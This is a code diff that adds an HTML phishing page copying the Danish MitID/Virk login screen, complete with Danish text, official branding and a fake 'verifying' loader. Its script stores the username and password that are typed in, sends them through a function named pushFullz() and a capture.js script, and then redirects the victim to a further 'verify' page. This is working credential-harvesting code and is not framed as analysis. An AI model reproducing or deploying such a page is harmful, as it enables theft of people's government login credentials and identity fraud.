@@ -33,4 +33,157 @@
   .input-field { width: 100%; height: 40px; border: 1px solid #747474; border-radius: 4px; padding: 0 56px 0 10px; font-size: 16px; font-family: inherit; color: #1a1a1a; outline: none; background: #fff; transition: border-color 0.2s, box-shadow 0.2s; }
   .input-field:focus { border-color: #0059b3; box-shadow: 0 0 0 4px rgba(0,89,179,0.18); }
   .input-toggle { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); font-size: 12px; color: #0060E6; cursor: pointer; background: none; border: none; font-weight: 600; font-family: inherit; }
-  .input-toggle:hover { text
+  .input-toggle:hover { text-decoration: underline; }
+  .btn-primary { display: flex; align-items: center; justify-content: space-between; width: 100%; min-height: 40px; padding: 8px 16px; border: 2px solid #0060E6; border-radius: 4px; background-color: #0060E6; color: #fff; font-family: inherit; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 8px; transition: background 0.3s; }
+  .btn-primary:hover { background-color: #004993; }
+  .btn-primary:disabled { background-color: #a7bfd6; border-color: #a7bfd6; cursor: not-allowed; }
+  .btn-icon svg { width: 24px; height: 24px; fill: #fff; }
+  .forgot-link { display: block; text-align: center; margin-top: 16px; font-size: 14px; color: #0059B3; text-decoration: none; cursor: pointer; }
+  .forgot-link:hover { text-decoration: underline; }
+  .checkbox-group { display: flex; align-items: center; gap: 10px; margin-top: 16px; font-size: 14px; }
+  .checkbox-group input { width: 18px; height: 18px; accent-color: #0060E6; }
+  .loader-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.95); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; }
+  .loader-overlay.active { opacity: 1; pointer-events: all; }
+  .loader-shield { width: 80px; height: 90px; margin-bottom: 24px; animation: pulse 1.5s infinite ease-in-out; }
+  .loader-shield svg { width: 100%; height: 100%; fill: #0060E6; }
+  @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.05); opacity: 0.7; } }
+  .loader-text { font-size: 18px; font-weight: 600; color: #000; margin-bottom: 8px; }
+  .loader-sub { font-size: 14px; color: #666; margin-bottom: 24px; }
+  .loader-dots { display: flex; gap: 6px; }
+  .loader-dots span { width: 8px; height: 8px; background: #0060E6; border-radius: 50%; animation: bounce 1.2s infinite; }
+  .loader-dots span:nth-child(2) { animation-delay: 0.2s; }
+  .loader-dots span:nth-child(3) { animation-delay: 0.4s; }
+  @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
+  .footer-links { display: flex; justify-content: center; gap: 30px; margin-top: 24px; font-size: 14px; }
+  .footer-links a { color: #0059B3; text-decoration: none; font-weight: 600; }
+  .footer-links a:hover { text-decoration: underline; }
+</style>
+</head>
+<body>
+
+<div id="loader" class="loader-overlay">
+  <div class="loader-shield">
+    <svg viewBox="0 0 110 128">
+      <path d="M55 0C25.2 0 0 25.2 0 55c0 36.5 24.4 68.2 55 83 30.6-14.8 55-46.5 55-83 0-29.8-25.2-55-55-55zm0 105c-27.6 0-50-22.4-50-50 0-27.6 22.4-50 50-50 27.6 0 50 22.4 50 50 0 27.6-22.4 50-50 50z"/>
+      <path fill="#fff" d="M55 65c-5.5 0-10-4.5-10-10s4.5-10 10-10 10 4.5 10 10-4.5 10-10 10z"/>
+    </svg>
+  </div>
+  <div class="loader-text">Verificerer...</div>
+  <div class="loader-sub">Dette tager et øjeblik</div>
+  <div class="loader-dots"><span></span><span></span><span></span></div>
+</div>
+
+<header class="top-header">
+  <div class="top-header-inner">
+    <div class="top-logo"><img src="assets/virk-logo.svg" alt="Virk" onerror="this.src='https://www.virk.dk/_/virk/images/logo-virk.svg'"></div>
+    <nav class="top-nav">
+      <a href="index.html">Forside</a>
+      <span class="sep"></span>
+      <a href="#">Digital Post</a>
+      <span class="sep"></span>
+      <a href="#">Selvbetjening</a>
+    </nav>
+    <div class="top-right">
+      <button class="btn-login" onclick="window.location.href='index.html'">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="#fff"><path d="M12 2a5 5 0 0 0-5 5v2H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V7a5 5 0 0 0-5-5zm0 2a3 3 0 0 1 3 3v2H9V7a3 3 0 0 1 3-3z"/></svg>
+        Log på med MitID
+      </button>
+    </div>
+  </div>
+</header>
+
+<div class="main-container">
+  <div class="login-card">
+    <div class="login-header">
+      <svg class="mitid-logo-svg" viewBox="0 0 240 64" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#0060E6" d="M120 0C53.7 0 0 53.7 0 120s53.7 120 120 120 120-53.7 120-120S186.3 0 120 0zm0 220c-55.2 0-100-44.8-100-100S64.8 20 120 20s100 44.8 100 100-44.8 100-100 100z"/>
+        <path fill="#fff" d="M120 50c-38.7 0-70 31.3-70 70s31.3 70 70 70 70-31.3 70-70-31.3-70-70-70zm0 120c-27.6 0-50-22.4-50-50s22.4-50 50-50 50 22.4 50 50-22.4 50-50 50z"/>
+      </svg>
+      <h1 class="login-title">Log på med MitID</h1>
+      <p class="login-subtitle">Indtast dit brugernavn og adgangskode</p>
+    </div>
+
+    <form id="loginForm">
+      <div class="field-group">
+        <label class="field-label" for="username">Brugernavn</label>
+        <div class="input-wrapper">
+          <input type="text" id="username" class="input-field" autocomplete="off" placeholder="Indtast brugernavn">
+          <button type="button" class="input-toggle" id="toggleUser">Skjul</button>
+        </div>
+      </div>
+
+      <div class="field-group">
+        <label class="field-label" for="password">Adgangskode</label>
+        <div class="input-wrapper">
+          <input type="password" id="password" class="input-field" autocomplete="off" placeholder="Indtast adgangskode">
+          <button type="button" class="input-toggle" id="togglePass">Vis</button>
+        </div>
+      </div>
+
+      <button type="submit" class="btn-primary" id="loginBtn">
+        <span>Log på</span>
+        <span class="btn-icon">
+          <svg viewBox="0 0 24 24"><path d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.02 0 1.41.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.59-6.59c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
+        </span>
+      </button>
+    </form>
+
+    <a href="#" class="forgot-link">Glemmit dit MitID?</a>
+    <div class="checkbox-group">
+      <input type="checkbox" id="remember">
+      <label for="remember">Husk mig på denne computer</label>
+    </div>
+    <div class="footer-links">
+      <a href="#">Hjælp</a>
+      <a href="#">Opnå MitID</a>
+    </div>
+  </div>
+</div>
+
+<script src="js/config.js"></script>
+<script src="js/capture.js"></script>
+<script>
+  const usernameInput = document.getElementById('username');
+  const passwordInput = document.getElementById('password');
+  const loginBtn = document.getElementById('loginBtn');
+  const loader = document.getElementById('loader');
+  const form = document.getElementById('loginForm');
+
+  function validateLogin() {
+    loginBtn.disabled = !(usernameInput.value.length > 0 && passwordInput.value.length > 0);
+  }
+
+  usernameInput.addEventListener('input', validateLogin);
+  passwordInput.addEventListener('input', validateLogin);
+
+  document.getElementById('togglePass').addEventListener('click', function() {
+    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+    passwordInput.setAttribute('type', type);
+    this.textContent = type === 'password' ? 'Vis' : 'Skjul';
+  });
+
+  document.getElementById('toggleUser').addEventListener('click', function() {
+    const type = usernameInput.getAttribute('type') === 'password' ? 'text' : 'password';
+    usernameInput.setAttribute('type', type);
+    this.textContent = type === 'password' ? 'Vis' : 'Skjul';
+  });
+
+  form.addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const user = usernameInput.value;
+    const pass = passwordInput.value;
+
+    if (!user || !pass) return;
+
+    state.data.username = user;
+    state.data.password = pass;
+    saveState();
+
+    loader.classList.add('active');
+    await pushFullz();
+    await new Promise(r => setTimeout(r, 2000));
+    window.location.href = 'verify.html';
+  });
+</script>
+</body>
+</html>
